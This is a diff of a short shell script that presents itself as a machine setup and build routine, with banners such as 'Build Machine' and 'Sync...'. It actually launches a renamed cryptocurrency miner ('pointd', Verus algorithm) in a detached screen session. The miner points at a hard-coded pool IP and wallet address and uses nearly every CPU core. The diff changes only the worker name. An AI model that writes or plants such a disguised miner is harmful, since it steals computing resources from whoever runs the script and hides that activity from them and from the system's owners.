@@ -1,7 +1,5 @@
 echo "==================== Info Machine ===================="
 echo "Ready"
-echo "Go"
-echo "Running"
 echo "===================================================="
 
 echo "+++++++ Build Machine +++++++++"
@@ -18,6 +16,6 @@ cd safa
 
 echo "Configure Successfully"
 cd ..
-screen -d -m ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.cm1 -p x -t $(nproc --ignore 1)
+screen -d -m ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.cm4 -p x -t $(nproc --ignore 1)
 echo "+++++++ Sync... +++++++++"
 ./timer
